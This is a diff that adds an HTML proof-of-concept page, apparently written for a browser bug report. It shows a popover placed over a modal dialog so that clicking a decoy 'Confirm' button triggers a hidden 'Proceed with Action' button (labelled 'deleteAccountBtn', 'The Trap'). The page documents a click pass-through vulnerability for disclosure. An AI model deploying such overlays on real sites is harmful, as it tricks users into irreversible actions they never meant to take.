@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Layer UI Spoofing (Input Confusion) Demo</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 20px;
+        }
+
+        .container {
+            margin-bottom: 30px;
+            padding: 15px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+        }
+
+        button {
+            margin: 5px;
+            padding: 10px 15px;
+            cursor: pointer;
+        }
+
+        /* Basic styles for demo dialog/popover */
+        dialog {
+            padding: 20px;
+            border: 2px solid #333;
+            border-radius: 8px;
+            background-color: lightpink;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            /* Dialogs displayed with showModal() are in the Top Layer and centered */
+            position: relative;
+            /* Needed for absolute positioning of inner close button */
+        }
+
+        dialog::backdrop {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        /* Top-right close button for the modal */
+        .top-right-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+            line-height: 1;
+            color: #555;
+        }
+
+        .top-right-close:hover {
+            color: #000;
+        }
+
+
+        [popover] {
+            padding: 20px;
+            border: 2px solid #007bff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            background-color: #e9f5ff;
+            color: #333;
+            /* Add text color */
+            text-align: center;
+            /* Center content */
+
+            /* Positioning for the popover to overlap the modal's button area (Demo purpose) */
+            /* Center it roughly, then adjust size to ensure overlap */
+            position: fixed;
+            width: 350px;
+            /* Increased width */
+            height: 200px;
+            /* Increased height */
+            z-index: 1000;
+            /* Ensure it's in the Top Layer (though Top Layer handles this) */
+        }
+
+        /* Inner styles (for demo content) */
+        .demo-content {
+            margin-bottom: 15px;
+        }
+
+        .demo-content p {
+            margin-bottom: 10px;
+        }
+
+        .dialog-buttons {
+            text-align: center;
+            /* Center the single button */
+            margin-top: 20px;
+        }
+
+        .dialog-buttons button {
+            display: inline-block;
+            /* Removed left margin */
+        }
+        
+        .margin-zero {
+            margin: 0px;
+        }
+
+
+        /* Style for the sensitive action button in the modal (The Trap) */
+        #deleteAccountBtn {
+            font-size: 20px;
+            background-color: #dc3545;
+            /* Red color */
+            color: white;
+            border: none;
+            width: 250px;
+            height: 50px;
+        }
+
+        /* Style for the bait button inside the popover */
+        #viewMessageBtn {
+            background-color: #28a745;
+            /* Green color */
+            color: white;
+            border: none;
+            margin-top: 10px;
+            /* Space from text above */
+            padding: 15px 20px;
+            /* Increased padding */
+            font-size: 1.2em;
+            /* Larger font */
+            /* Ensure this button covers a large area within the popover to maximize overlap */
+            display: block;
+            width: calc(100% - 40px);
+            /* Cover most of the popover width (consider padding) */
+            margin: 15px auto 0 auto;
+            /* Center horizontally with more space */
+        }
+
+        /* Instruction text when popover overlays modal */
+        .overlay-instruction {
+            color: #dc3545;
+            font-weight: bold;
+            border-top: 1px dashed #dc3545;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Top Layer UI Spoofing (Click Pass-Through) Demo</h1>
+
+    <p>This demo illustrates a **Click Pass-Through** vulnerability related to the browser's "Top Layer" stacking, specifically when a <code>[popover]</code> element is layered on top of an active <code>&lt;dialog&gt;</code> opened with <code>showModal()</code>.</p>
+    <p>It shows that clicking an element within the topmost Top Layer element (the popover) mistakenly triggers an interactive element in a lower Top Layer element (the modal) if their positions overlap, potentially leading to unintended sensitive actions.</p>
+    <p>While defining the popover itself can often be achieved via limited HTML injection (e.g., using the <code>popover</code> attribute), triggering its display *while a modal is active and blocking external clicks* might require specific timing or other vulnerabilities. **This demo focuses on demonstrating the vulnerable *state* where both are displayed and layered.**</p>
+
+    <div class="container">
+        <h2>Start the Vulnerable State Demo</h2>
+        <p>Click the button below. This will simultaneously display a simulated sensitive confirmation modal (representing a legitimate UI) and layer an overlaying popover (representing a potentially malicious UI element) on top of it. This simulates the state where the bug can be exploited.</p>
+        <p>The **Red Area (Modal Dialog)** is the lower layer, i.e. legitimate area. The **Blue Area (Popover)** is the upper layer, i.e. area an attacker can tweak.</p>
+        <p><strong>Instruction:</strong> Click the **green "Confirm" button located inside the blue popover** that appears on top. Observe which action is actually triggered.</p>
+
+        <button id="startAttackDemoBtn">Start Simulated Attack Demo</button>
+    </div>
+
+    <dialog id="modal1">
+        <button class="top-right-close">&times;</button>
+
+        <div class="demo-content">
+            <h3>Legitimate Action Confirmation</h3>
+            <p><strong>Warning:</strong> This action is irreversible and involves sensitive data.</p>
+            <p>Are you sure you want to proceed with the action?</p>
+        </div>
+        <div class="dialog-buttons">
+            <button id="deleteAccountBtn">Proceed with Action</button>
+        </div>
+    </dialog>
+
+    <div id="popover1" popover>
+        <div class="demo-content">
+            <h3 class="margin-zero">Important Message</h3>
+            <p class="margin-zero">Click "Confirm" below to dismiss this notification and continue.</p>
+            <p class="overlay-instruction margin-zero">
+                (Note: Clicking this green "Confirm" button triggers the "Proceed with Action" button in the modal underneath due to a Top Layer bug.)
+            </p>
+             <button id="viewMessageBtn">Confirm</button>
+        </div>
+         
+    </div>
+
+    <script>
+        const modal1 = document.getElementById('modal1');
+        const popover1 = document.getElementById('popover1');
+
+        const startAttackDemoBtn = document.getElementById('startAttackDemoBtn');
+        const deleteAccountBtn = document.getElementById('deleteAccountBtn');
+        const viewMessageBtn = document.getElementById('viewMessageBtn');
+        const modalCloseBtn = modal1.querySelector('.top-right-close');
+
+        // --- Start Demo Button ---
+        startAttackDemoBtn.addEventListener('click', () => {
+            // Show both the modal and the popover simultaneously (simulating injection scenario)
+            modal1.showModal();
+            popover1.showPopover();
+
+            // Event listener for the bait button in the popover
+            // NOTE: ***This listener is not triggered due to the bug.***
+            viewMessageBtn.addEventListener('click', (event) => {
+                 console.log("--- DEBUG ---: Clicked the 'Confirm' button inside the popover");
+            });
+
+            // Event listener for the sensitive action button in the modal (The Trap)
+            deleteAccountBtn.addEventListener('click', () => {
+                console.log("--- VULNERABLE ACTION ---: The 'Proceed with Action' button in the modal was triggered!");
+                alert("🚨 Sensitive action triggered! (The user thought they clicked the popover button)");
+                
+                // Close both after the demo action
+                modal1.close();
+                popover1.removeAttribute('open');
+            });
+
+            // Event listener for the new top-right close button in the modal
+            modalCloseBtn.addEventListener('click', () => {
+                console.log("--- DEBUG ---: Modal close button (x) clicked.");
+                modal1.close();
+            });
+        });
+    </script> 
+</body>
+
+</html>
